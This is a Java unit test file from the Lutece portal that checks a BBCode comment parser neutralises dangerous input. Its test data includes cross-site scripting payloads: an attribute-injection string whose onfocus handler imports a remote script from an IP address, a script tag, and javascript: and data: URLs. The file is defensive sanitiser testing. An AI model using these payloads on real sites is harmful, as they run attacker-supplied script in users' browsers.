/*
 * Copyright (c) 2002-2025, City of Paris
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *  1. Redistributions of source code must retain the above copyright notice
 *     and the following disclaimer.
 *
 *  2. Redistributions in binary form must reproduce the above copyright notice
 *     and the following disclaimer in the documentation and/or other materials
 *     provided with the distribution.
 *
 *  3. Neither the name of 'Mairie de Paris' nor 'Lutece' nor the names of its
 *     contributors may be used to endorse or promote products derived from
 *     this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * License 1.0
 */
package fr.paris.lutece.portal.service.editor;

import java.io.File;

import org.jsoup.Jsoup;

import fr.paris.lutece.portal.service.util.AppPropertiesService;
import fr.paris.lutece.portal.service.util.AppPathService;
import junit.framework.TestCase;

/**
 * Tests for {@link EditorBbcodeService} comment parsing.
 */
public class EditorBbcodeServiceTest extends TestCase
{
    @Override
    protected void setUp( ) throws Exception
    {
        File webappDirectory = new File( "webapp" ).getAbsoluteFile( );
        AppPathService.init( webappDirectory.getPath( ) );
        AppPropertiesService.init( "/WEB-INF/conf/" );
    }

    /**
     * A plain-text comment is preserved unchanged.
     */
    public void testParseCommentKeepsPlainText( )
    {
        String strComment = "testOK";

        assertEquals( strComment, EditorBbcodeService.getInstance( ).parseComment( strComment ) );
    }

    /**
     * BBCode remains available in comments.
     */
    public void testParseCommentRendersBbcode( )
    {
        assertEquals( "Comment <b>important</b>", EditorBbcodeService.getInstance( ).parseComment( "Comment [b]important[/b]" ) );
    }

    /**
     * A null comment is preserved without invoking the parser.
     */
    public void testParseCommentHandlesNullValue( )
    {
        assertNull( EditorBbcodeService.getInstance( ).parseComment( null ) );
    }

    /**
     * An empty comment remains empty.
     */
    public void testParseCommentKeepsEmptyValue( )
    {
        assertEquals( "", EditorBbcodeService.getInstance( ).parseComment( "" ) );
    }

    /**
     * An attribute-injection payload in a BBCode link has its link removed while its text is preserved.
     */
    public void testParseCommentRejectsAttributeInjectionPayload( )
    {
        assertInvalidUrlIsUnwrapped( "y' autofocus onfocus ='import(`//1.1.1.1`+String.fromCharCode(58)+`8000/p.js`)" );
    }

    /**
     * Raw HTML must be retained as text instead of being interpreted as markup.
     */
    public void testParseCommentEscapesRawHtml( )
    {
        String strResult = EditorBbcodeService.getInstance( ).parseComment( "<script>alert('x')</script>" );

        assertFalse( strResult.contains( "<script" ) );
        assertFalse( strResult.contains( "</script>" ) );
        assertTrue( Jsoup.parseBodyFragment( strResult ).text( ).contains( "alert('x'" ) );
    }

    /**
     * Links using a dangerous scheme or malformed markup must have their link removed.
     */
    public void testParseCommentRejectsInvalidUrls( )
    {
        String [ ] invalidUrls = {
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "https://example.org/?q=<script>"
        };

        for ( String strUrl : invalidUrls )
        {
            assertInvalidUrlIsUnwrapped( strUrl );
        }
    }

    /**
     * Asserts that an invalid BBCode URL no longer creates a link while keeping its text visible.
     *
     * @param strUrl
     *            the invalid URL
     */
    private void assertInvalidUrlIsUnwrapped( String strUrl )
    {
        String strResult = EditorBbcodeService.getInstance( ).parseComment( "[url]" + strUrl + "[/url]" );

        assertTrue( Jsoup.parseBodyFragment( strResult ).select( "a" ).isEmpty( ) );
        assertEquals( strUrl, Jsoup.parseBodyFragment( strResult ).text( ) );
    }
}
